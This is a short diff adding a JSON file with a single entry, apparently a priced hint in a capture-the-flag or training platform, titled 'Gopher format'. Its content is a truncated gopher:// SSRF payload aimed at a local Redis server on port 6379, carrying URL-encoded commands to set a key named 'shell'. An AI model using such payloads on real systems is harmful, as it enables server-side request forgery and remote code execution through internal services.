@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Gopher format",
+    "cost": 25,
+    "content": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0ashell%0d%0a..."
+  }
+]
